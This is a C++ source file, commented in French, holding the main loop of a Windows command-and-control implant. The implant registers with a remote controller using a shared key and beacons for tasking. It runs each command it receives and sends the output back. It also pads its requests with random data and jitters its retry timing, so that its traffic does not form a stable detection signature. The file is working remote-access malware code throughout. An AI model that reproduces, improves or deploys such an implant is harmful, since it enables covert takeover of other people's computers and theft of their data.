#include "beacon.h"
#include "commands.h"
#include "config.h"
#include "json.h"
#include "log.h"
#include "network.h"
#include "service.h"
#include <windows.h>
#include <chrono>
#include <random>
#include <string>
#include <thread>

namespace {

std::mt19937& rng() {
	static std::mt19937 generator(std::random_device{}());
	return generator;
}

// Remplissage aleatoire du corps : la taille des requetes ne doit pas devenir
// une signature stable. Le controleur ignore ce champ.
std::string random_padding() {
	static const char alphabet[] =
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	std::uniform_int_distribution<int> length(PadMinBytes, PadMaxBytes);
	std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);

	std::string pad;
	pad.reserve(PadMaxBytes);
	const int size = length(rng());
	for (int i = 0; i < size; ++i) {
		pad += alphabet[pick(rng())];
	}
	return pad;
}

bool stop_requested() {
	HANDLE event = stop_event();
	return event != nullptr && WaitForSingleObject(event, 0) == WAIT_OBJECT_0;
}

// Attend `delay` ms, mais retourne des que l'arret est demande.
// Retourne true si on doit continuer, false si arret demande.
bool interruptible_sleep(int delay) {
	HANDLE event = stop_event();
	if (!event) {
		std::this_thread::sleep_for(std::chrono::milliseconds(delay));
		return true;
	}
	return WaitForSingleObject(event, static_cast<DWORD>(delay)) == WAIT_TIMEOUT;
}

// Attente exponentielle plafonnee avec jitter, apres un echec.
int backoff_delay_ms(int step) {
	std::uniform_int_distribution<int> percent(100 - BackoffJitterPct,
		100 + BackoffJitterPct);
	const int clamped = step < BackoffSteps ? step : BackoffSteps - 1;
	return BackoffMs[clamped] * percent(rng()) / 100;
}

bool wait_backoff(const HttpReply& reply, int& failures) {
	const int delay = backoff_delay_ms(failures);
	++failures;

	const std::string detail = (reply.result == SendResult::NetworkError)
		? "reseau " + std::to_string(reply.error)
		: "HTTP " + std::to_string(reply.status);

	log_line("echec " + detail + ", retry dans " + std::to_string(delay / 1000) +
		" s [tentative " + std::to_string(failures) + "]");
	return interruptible_sleep(delay);
}

// --- Corps des requetes ----------------------------------------------------
// JsonObject echappe chaque valeur

std::string build_register_body() {
	JsonObject body;
	body.add("client_id", AGENT_ID)
		.add("shared_key", AGENT_SHARED_KEY)
		.add("ip_private", local_ipv4());
	return body.dump();
}

std::string build_beacon_body() {
	JsonObject body;
	body.add("client_id", AGENT_ID).add("pad", random_padding());
	return body.dump();
}

std::string build_result_body(const std::string& command_id,
                              const std::string& output) {
	JsonObject body;
	body.add("command_id", command_id)
		.add("command_response", output)
		.add("status", "OK");
	return body.dump();
}

}  // namespace

void start_implant() {
	std::string session_token;
	std::string pending_result;   // corps de /result a envoyer au tour suivant
	int failures = 0;
	int fast_empty_replies = 0;
	bool degraded = false;        // le controleur ne tient pas la requete

	if (stop_requested()) {
		return;
	}

	for (;;) {
		if (stop_requested() && pending_result.empty()) {
			return;
		}

		// --- 1. enregistrement aupres du controleur ------------------------
		if (session_token.empty()) {
			const HttpReply reply = post_json(RegisterPath, build_register_body());

			if (reply.result != SendResult::Ok) {
				if (!wait_backoff(reply, failures)) return;
				continue;
			}

			const auto token = json_get_string(reply.body, "session_token");
			if (reply.status != 200 || !token || token->empty()) {
				log_line("enregistrement refuse (HTTP " + std::to_string(reply.status) +
					") : verifier AGENT_ID et AGENT_SHARED_KEY");
				if (!wait_backoff(reply, failures)) return;
				continue;
			}

			session_token = *token;
			failures = 0;
			log_line("enregistre aupres du controleur");
			continue;   // on enchaine sur le premier beacon
		}

		// --- 2. resultat de la commande precedente -------------------------
		if (!pending_result.empty()) {
			const HttpReply reply = post_json(ResultPath, pending_result, session_token);

			if (reply.result != SendResult::Ok) {
				if (!wait_backoff(reply, failures)) return;
				continue;
			}
			if (reply.status == 401) {
				session_token.clear();      // session expiree : on se re-enregistre
				continue;
			}
			if (reply.status != 200) {
				log_line("resultat refuse (HTTP " + std::to_string(reply.status) + ")");
			}
			pending_result.clear();
			failures = 0;
		}

		// --- 3. beacon : le controleur tient la requete --------------------
		const auto started = std::chrono::steady_clock::now();
		const HttpReply reply = post_json(BeaconPath, build_beacon_body(), session_token);
		const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
			std::chrono::steady_clock::now() - started).count();

		if (reply.result != SendResult::Ok) {
			if (!wait_backoff(reply, failures)) return;
			continue;
		}
		if (reply.status == 401) {
			session_token.clear();
			continue;
		}
		if (reply.status != 200) {
			if (!wait_backoff(reply, failures)) return;
			continue;
		}

		const auto command_id = json_get_string(reply.body, "command_id");
		const auto command = json_get_string(reply.body, "command");
		if (!command_id || !command) {
			log_line("reponse illisible : " + reply.body);
			continue;
		}

		failures = 0;

		if (!command->empty()) {
			log_line("commande executee : " + *command);
			std::string output = execute_command(*command);
			if (output.empty()) {
				output = "(pas de sortie)";
			}
			pending_result = build_result_body(*command_id, output);
			continue;   // le resultat part au tour suivant, immediatement
		}

		// --- 4. garde anti-boucle -----------------------------------------
		// Un controleur qui ne tient pas la requete repond vide en quelques
		// millisecondes. Sans cette temporisation, on reposterait en boucle.
		if (elapsed_ms < FastReplyThresholdMs) {
			if (++fast_empty_replies >= FastReplyMaxCount && !degraded) {
				degraded = true;
				log_line("le controleur ne tient pas la requete : mode degrade (" +
					std::to_string(FallbackBeaconIntervalMs / 1000) +
					" s entre deux beacons)");
			}
		}
		else {
			fast_empty_replies = 0;
			if (degraded) {
				degraded = false;
				log_line("le controleur tient a nouveau la requete : mode nominal");
			}
		}

		const int pause_ms = degraded ? FallbackBeaconIntervalMs : BeaconIntervalMs;
		if (pause_ms > 0) {
			if (!interruptible_sleep(pause_ms)) return;
		}
	}
}
